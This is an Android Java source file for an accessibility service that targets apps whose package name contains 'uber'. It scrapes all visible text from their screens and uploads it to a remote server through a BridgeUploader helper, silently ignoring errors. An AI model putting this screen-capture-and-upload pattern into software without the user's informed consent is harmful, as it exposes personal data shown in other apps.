package jp.foundr1.store.bridge;

import android.accessibilityservice.AccessibilityService;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.HashSet;
import java.util.Set;

public class UberAccessibilityService extends AccessibilityService {
    private final Handler handler = new Handler(Looper.getMainLooper());
    private String pendingPackageName = "";
    private String pendingText = "";
    private String lastUploadedText = "";
    private long lastUploadedAt = 0L;
    private final Runnable uploadRunnable = () -> {
        String text = pendingText.trim();
        if (text.length() < 8) return;
        long now = System.currentTimeMillis();
        if (text.equals(lastUploadedText) && now - lastUploadedAt < 30000) return;
        lastUploadedText = text;
        lastUploadedAt = now;
        try {
            JSONObject payload = new JSONObject();
            payload.put("screenText", text);
            payload.put("textLength", text.length());
            BridgeUploader.upload(this, "accessibility_screen", pendingPackageName, payload);
        } catch (Exception ignored) {
        }
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null) return;
        String packageName = event.getPackageName().toString();
        if (!looksLikeUber(packageName)) return;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        StringBuilder builder = new StringBuilder();
        collectText(root, builder, new HashSet<>());
        root.recycle();
        pendingPackageName = packageName;
        pendingText = builder.toString();
        handler.removeCallbacks(uploadRunnable);
        handler.postDelayed(uploadRunnable, 1800);
    }

    @Override
    public void onInterrupt() {
    }

    private void collectText(AccessibilityNodeInfo node, StringBuilder builder, Set<Integer> seen) {
        if (node == null) return;
        int hash = System.identityHashCode(node);
        if (seen.contains(hash)) return;
        seen.add(hash);
        append(builder, node.getText());
        append(builder, node.getContentDescription());
        for (int index = 0; index < node.getChildCount(); index += 1) {
            AccessibilityNodeInfo child = node.getChild(index);
            if (child == null) continue;
            collectText(child, builder, seen);
            child.recycle();
        }
    }

    private void append(StringBuilder builder, CharSequence value) {
        if (value == null) return;
        String text = value.toString().trim();
        if (text.isEmpty()) return;
        if (builder.length() > 0) builder.append('\n');
        builder.append(text);
    }

    private boolean looksLikeUber(String packageName) {
        String value = packageName == null ? "" : packageName.toLowerCase();
        return value.contains("uber");
    }
}
